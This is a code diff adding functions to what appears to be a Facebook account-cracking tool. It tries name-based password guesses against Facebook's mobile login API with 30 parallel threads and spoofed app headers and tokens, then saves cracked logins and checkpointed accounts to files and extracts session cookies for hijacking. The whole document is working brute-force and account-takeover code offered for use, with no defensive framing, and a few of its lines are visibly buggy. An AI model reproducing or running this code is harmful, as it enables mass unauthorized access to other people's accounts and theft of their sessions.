@@ -357,4 +357,199 @@ def method():
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mWASI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/WASIM-OK.txt','a').write(f'{acc} • {pword}\n')
+                if 'y' in apps:
+                	check(r,coki)
+                if c=='y':
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mWASIM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                cpacc.append(acc)
+                open('/sdcard/WASIM-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1    
+      except Exception as e: time.sleep(10)
+
+    if m=='2':
+        with speed(max_workers=30) as speede:
+             speede.map(start2, accounts)
+    elif m=='1':
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    else:
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    exit()  
+      
+
+
+
+####@-----Random-----@####
+def andom():
+    okacc = []
+    cpacc = []
+    totalpass = []
+    os.system("clear")
+    print(logo)
+    if 'o': 
+        tpp = input(f'{oo("?")}Total Password? : ')
+        totalpass.append('first')
+        totalpass.append('last')
+        if tpp.isnumeric():
+            ex = 'firstlast first123 last123'
+            print(f'{oo("+")}{ex} (ETC)')
+            for x in range(int(tpp)):
+                totalpass.append(input(f'{oo(x+1)}Password : '))
+            pass
+        else:
+            print(f"{oo('!')}Numeric Only")
+            exit()
+    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
+    m=input(f"{oo('!')}Input : ") 
+    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
+    cpok=input(f"{oo('!')}Input : ")
+    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
+    c=input(f"{oo('!')}Input : ")
+    os.system("clear")
+    print(logo) 
+    print('\033[1;93m='*25)
+    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
+    print(f"{oo('-')}Wait As You Can :)")
+    print(f"{oo('•')}/sdcard/WASIM-OK.txt")
+    print('\033[1;93m='*25)
+    print()    
+    def start(user):
+     try:
+        global loop,accounts
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97mWASI-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.flush()
+        for pword in totalpass:              
+            heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+      #      print(response.text)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mWASIM-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/WASIM-OK.txt','a').write(f'{acc} • {pword}\n')
+                if c=='y':
+                    try:
+                           q = json.loads(response.text)
+                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                           cookies = f"sb={ssbb};{ckkk}"
+                    except Exception as e:print(str(e)+' | '+response.text)
+                break
+            elif 'www.facebook.com' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mWASIM-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                cpacc.append(acc)
+                open('/sdcard/WASIM-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1
+     except Exception as e:time.sleep(10)
+   
+
+
+
+ 
+    def start2(user):
+      global loop,accounts
+      try:
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+            last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97mWAS-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.flush()
+        for pword in totalpass:
+            heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mWASIM-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/WASIM-OK.txt','a').write(f'{acc} • {pword}\n')
+                if 'y' in apps:
+                	check(r,coki)
+                if c=='y':
+                 try:  
+                  q = json.loads(response.text)
+                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                  cookies = f"sb={ssbb};{ckkk}"
+                 except Exception as e:print(str(e)+' | '+response.text)
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
+                 break
+            elif 'checkpoint' in response.text:
+                if cpok=='n':
+                     pass
+                else:
+                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                cpacc.append(acc)
+                open('/sdcard/WASIM-CP.txt','a').write(f'{acc} • {pword}\n')
+                break
+            else:
+                continue
+        loop += 1    
+      except Exception as e: time.sleep(10)
+
+      
+    for x in open('.rndm','r').read().splitlines():
+    	accounts.append(x)
+    
+    if m=='2':
+        with speed(max_workers=30) as speeed:
+             speede.map(start2, accounts)
+    elif m=='1':
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    else:
+       with speed(max_workers=30) as speede:
+            speede.map(start, accounts)
+    exit()
+
+
+
+
+Hxw_Main()
